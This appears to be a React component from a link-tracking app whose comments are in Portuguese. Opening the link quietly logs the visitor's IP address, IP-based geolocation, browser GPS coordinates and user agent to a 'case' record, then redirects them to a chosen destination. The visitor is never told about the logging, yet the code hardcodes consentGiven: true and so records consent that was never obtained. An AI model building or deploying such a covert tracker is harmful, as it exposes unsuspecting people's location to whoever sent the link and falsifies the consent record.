import React, { useState, useEffect, useCallback } from 'react';
import { useParams } from 'react-router-dom';
import { WifiOff, Loader2, XCircle } from 'lucide-react';
import { getCaseById, addLogToCase } from '../services/storageService';
import { getIpData, getBrowserLocation } from '../services/geoService';
import { AccessLog } from '../types';
import { v4 as uuidv4 } from 'uuid';
import { db } from '../services/firebase';
import { Button } from '../components/Button'; // Mantendo Button para a tela de erro

export const TrackingView: React.FC = () => {
    const { id } = useParams<{ id: string }>();
    const [loading, setLoading] = useState(false);
    const [initialLoading, setInitialLoading] = useState(true);
    const [error, setError] = useState('');
    const [caseData, setCaseData] = useState<any>(undefined);

    // Função de rastreamento e redirecionamento separada
    const trackAndRedirect = useCallback(async (data: any) => {
        if (!id || !data) {
            setLoading(false);
            return;
        }

        try {
            // 1. Get IP Data
            const ipData = await getIpData();
            
            // 2. Try to get GPS (o navegador pedirá permissão aqui)
            let gpsData = undefined;
            try {
                const position = await getBrowserLocation(); 
                gpsData = {
                    latitude: position.coords.latitude,
                    longitude: position.coords.longitude,
                    accuracy: position.coords.accuracy
                };
            } catch (e) {
                console.log("GPS denied or unavailable or blocked by browser.");
            }

            // 3. Construct Log
            const log: AccessLog = {
                id: uuidv4(),
                timestamp: new Date().toISOString(),
                userAgent: navigator.userAgent,
                ip: ipData.ip,
                geoRaw: ipData,
                gps: gpsData,
                consentGiven: true
            };

            // 4. Save
            await addLogToCase(id, log);

            // 5. Redirect
            let url = data.destinationUrl?.trim();
            if (url) {
                if (!/^https?:\/\//i.test(url)) {
                    url = 'https://' + url;
                }
                window.location.href = url;
            } else {
                // Redirecionamento padrão se URL de destino for nula
                window.location.href = 'https://google.com';
            }

        } catch (err) {
            console.error(err);
            setError('Erro ao registrar o acesso. Redirecionando para o destino.');
            
            // Tenta redirecionar mesmo em caso de erro no log
            let url = data.destinationUrl?.trim();
            if (url) {
                if (!/^https?:\/\//i.test(url)) {
                    url = 'https://' + url;
                }
                window.location.href = url;
            } else {
                 window.location.href = 'https://google.com';
            }
        }
    }, [id]);


    useEffect(() => {
        const loadAndTrack = async () => {
            if (!id) {
                setInitialLoading(false);
                return;
            }

            const data = await getCaseById(id);
            setCaseData(data);
            setInitialLoading(false);

            if (data) {
                // Inicia o rastreamento e redirecionamento assim que os dados do caso forem carregados
                trackAndRedirect(data);
            }
        };

        loadAndTrack();
        
        // Cleanup function (caso o componente seja desmontado)
        return () => setLoading(false);
    }, [id, trackAndRedirect]);


    // === RENDERIZAÇÃO (Telas Visíveis ao Usuário) ===

    // 1. Tela de carregamento inicial
    if (initialLoading || loading) {
        return (
            <div className="min-h-screen flex items-center justify-center bg-slate-100">
                <Loader2 className="animate-spin w-8 h-8 text-slate-400" />
            </div>
        );
    }

    // 2. Tela de Caso Não Encontrado
    if (!caseData) {
        return (
            <div className="min-h-screen flex items-center justify-center bg-slate-100 p-4 font-sans">
                <div className="bg-white p-6 rounded-lg shadow-lg text-center max-w-sm border border-slate-200">
                    <WifiOff className="w-12 h-12 text-slate-400 mx-auto mb-3" />
                    <h3 className="text-lg font-bold text-slate-700 mb-2">Procedimento Não Encontrado</h3>
                    <p className="text-slate-500 text-sm mb-4">
                        O link é inválido ou o caso não existe neste banco de dados.
                    </p>
                    {/* Mantém a nota do Firebase em caso de erro de configuração */}
                    {!db && (
                        <div className="bg-yellow-50 p-3 rounded text-xs text-yellow-700 text-left border border-yellow-100">
                        <strong>Nota:</strong> O app está em modo Demo (Local). Para funcionar globalmente, configure as chaves do Firebase em <code>services/firebase.ts</code>.
                        </div>
                    )}
                </div>
            </div>
        );
    }
    
    // 3. Tela de Erro (Se o rastreamento falhar e não conseguir redirecionar)
    if (error) {
        return (
            <div className="min-h-screen flex items-center justify-center bg-red-50 p-4 font-sans">
                <div className="bg-white p-6 rounded-lg shadow-lg text-center max-w-sm border border-red-200">
                    <XCircle className="w-12 h-12 text-red-500 mx-auto mb-3" />
                    <h3 className="text-lg font-bold text-slate-700 mb-2">Erro</h3>
                    <p className="text-slate-500 text-sm mb-4">
                        {error}
                    </p>
                    <Button onClick={() => window.location.reload()} variant="primary">
                        Tentar Novamente
                    </Button>
                </div>
            </div>
        );
    }

    // 4. Último recurso: Tela de carregamento enquanto espera o window.location.href
    return (
        <div className="min-h-screen flex items-center justify-center bg-slate-100">
            <h1 className="text-lg text-slate-500">Iniciando Redirecionamento...</h1>
            <Loader2 className="animate-spin w-8 h-8 text-slate-400 ml-2" />
        </div>
    );
};